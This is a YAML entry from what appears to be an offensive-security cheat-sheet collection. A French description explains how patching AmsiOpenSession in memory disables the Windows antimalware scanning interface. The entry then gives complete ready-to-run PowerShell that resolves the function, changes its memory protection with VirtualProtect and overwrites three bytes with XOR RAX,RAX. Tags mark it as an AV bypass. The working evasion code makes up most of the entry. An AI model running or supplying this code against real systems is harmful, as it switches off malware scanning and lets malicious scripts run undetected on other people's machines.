---
description: |
  Avec ce code dans Powershell, il est possible de contourner l'AMSI. Nous modifierons les instructions d'assemblage elles-mêmes au lieu des données sur lesquelles elles agissent dans une technique connue sous le nom de patching binaire. Nous pouvons utiliser cette technique pour corriger le code et le forcer à échouer même si la structure de données est valide. Pour ce faire, nous remplaçons les 3 octets TEST RDX,RDX par une instruction XOR RAX,RAX, ce qui force le flux d'exécution à passer par la branche d'erreur, qui désactive l'AMSI.

  Command Reference:
  ```
  Obtain the memory address of AmsiOpenSession (Lookup Function)

  Modify the memory permissions where AmsiOpenSession is located (Lookup with DelegateType)

  Modify the three bytes at that location. (TEST RDX,RDX with an XOR RAX,RAX, Copy function)
  ```
command: |
  AMSI bypass in assembly based on the AmsiOpenSession

code: |
  function LookupFunc { 
    Param ($moduleName, $functionName)
    
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress")
    {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) 
  }

  function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType() 
  }

  [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
  $oldProtectionBuffer = 0
  $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
  $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 

  $buf = [Byte[]] (0x48, 0x31, 0xC0)
  [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

items:
  - Shell
services:
  - AV
OS:
  - Windows
  - Approved-tool
attack_types:
  - Bypassing
references:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Patching-AMSI-AmsiOpenSession
---